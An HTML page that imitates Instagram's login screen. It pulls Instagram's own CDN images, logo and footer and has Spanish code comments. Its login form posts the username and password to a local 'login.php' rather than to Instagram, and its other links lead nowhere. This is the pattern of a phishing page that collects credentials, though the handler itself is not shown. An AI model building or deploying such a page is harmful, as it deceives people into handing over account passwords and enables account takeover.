<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            margin-top: 30px;
        }

        .container {
            display: flex;
            max-width: 800px;
            width: 100%;
            justify-content: center;
            align-items: center;
        }

        .phones-images {
            position: relative;
            height: 590px;
            width: 450px;
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/ItXpZbU2Szo.png');
            background-position: -46px 0;
            background-repeat: no-repeat;
            display: none;
        }

        @media (min-width: 876px) {
            .phones-images {
                display: block;
            }
        }

        .screenshot {
            position: absolute;
            top: 27px;
            right: 58px;
            width: 250px;
            height: 538px;
            opacity: 0;
            transition: opacity 1.5s ease-in-out;
        }

        .screenshot.active {
            opacity: 1;
        }

        .right-column {
            width: 100%;
            max-width: 350px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 10px 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .login-box .logo {
            margin: 22px auto 12px;
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yK/r/ATdZ_23QQzo.png');
            background-position: 0px -52px;
            background-size: 177px 421px;
            width: 175px;
            height: 51px;
            background-repeat: no-repeat;
        }

        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            margin-top: 24px;
        }

        .input-field {
            width: 100%;
            height: 38px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            font-size: 12px;
            margin-bottom: 6px;
            color: #262626;
        }

        .input-field:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }

        .login-btn {
            width: 100%;
            height: 32px;
            background-color: #4cb5f9;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin: 8px 0;
        }

        .login-btn:disabled {
            background-color: rgba(0, 149, 246, 0.3);
            cursor: default;
        }

        .separator {
            display: flex;
            width: 100%;
            align-items: center;
            margin: 10px 0 18px;
        }

        .line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }

        .separator span {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }

        .fb-login {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            margin-bottom: 12px;
        }

        .fb-icon {
            display: inline-block;
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yK/r/ATdZ_23QQzo.png');
            background-position: -414px -259px;
            background-size: 440px 411px;
            width: 16px;
            height: 16px;
            background-repeat: no-repeat;
        }

        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            margin-top: 12px;
            margin-bottom: 10px;
        }

        .signup-box {
            padding: 20px;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .get-app {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            padding: 10px 0;
        }

        .get-app span {
            font-size: 14px;
        }

        .app-buttons {
            display: flex;
            gap: 8px;
        }

        .app-buttons img {
            height: 40px;
        }

        footer {
            padding: 0 20px;
            margin-bottom: 52px;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 8px 16px;
            margin-bottom: 12px;
        }

        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-copyright {
            display: flex;
            justify-content: center;
            gap: 16px;
            color: #8e8e8e;
            font-size: 12px;
        }

        .footer-copyright select {
            border: none;
            background: none;
            color: #8e8e8e;
            font-size: 12px;
            cursor: pointer;
            outline: none;
        }
    </style>
</head>
<body>

    <main>
        <div class="container">
            <div class="phones-images">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/y8/r/966be999242.png" class="screenshot active" alt="Screenshot 1">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yA/r/8233f81e3a4.png" class="screenshot" alt="Screenshot 2">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yG/r/a3c2005df82.png" class="screenshot" alt="Screenshot 3">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/y3/r/688cd26e843.png" class="screenshot" alt="Screenshot 4">
            </div>

            <div class="right-column">
                <div class="box login-box">
                    <div class="logo"></div>
                    
                    <form class="login-form" method="POST" action="login.php">
                        <input type="text" class="input-field" name="username" placeholder="Phone number, username, or email" required>
                        <input type="password" class="input-field" name="password" placeholder="Password" required>
                        
                        <button type="submit" class="login-btn" id="login-btn" disabled>Log In</button>
                        
                        <div class="separator">
                            <div class="line"></div>
                            <span>or</span>
                            <div class="line"></div>
                        </div>

                        <a href="#" class="fb-login">
                            <span class="fb-icon"></span>
                            Log in with Facebook
                        </a>

                        <a href="#" class="forgot-password">Forgot password?</a>
                    </form>
                </div>

                <div class="box signup-box">
                    <span>Don't have an account? <a href="#">Sign up</a></span>
                </div>

                <div class="get-app">
                    <span>Get the app.</span>
                    <div class="app-buttons">
                        <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-HDg.png" alt="Download on App Store"></a>
                        <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-HDg.png" alt="Get it on Google Play"></a>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        <div class="footer-links">
            <a href="#">Dance</a>
            <a href="#">Food & Drink</a>
            <a href="#">Home & Garden</a>
            <a href="#">Music</a>
            <a href="#">Visual Arts</a>
        </div>
        <div class="footer-copyright">
            <select>
                <option value="en">English</option>
                <option value="es">Español</option>
            </select>
            <span>© 2026 Instagram from Meta</span>
        </div>
    </footer>

    <script>
        // Animación de los teléfonos
        const screenshots = document.querySelectorAll('.screenshot');
        let currentIdx = 0;

        setInterval(() => {
            screenshots[currentIdx].classList.remove('active');
            currentIdx = (currentIdx + 1) % screenshots.length;
            screenshots[currentIdx].classList.add('active');
        }, 4000);

        // Habilitar botón de ingreso al escribir
        const usernameInput = document.getElementsByName('username')[0];
        const passwordInput = document.getElementsByName('password')[0];
        const loginBtn = document.getElementById('login-btn');

        function validateInputs() {
            if (usernameInput.value.trim().length >= 1 && passwordInput.value.trim().length >= 6) {
                loginBtn.disabled = false;
                loginBtn.style.backgroundColor = '#0095f6';
            } else {
                loginBtn.disabled = true;
                loginBtn.style.backgroundColor = 'rgba(0, 149, 246, 0.3)';
            }
        }

        usernameInput.addEventListener('input', validateInputs);
        passwordInput.addEventListener('input', validateInputs);
    </script>
</body>
</html>
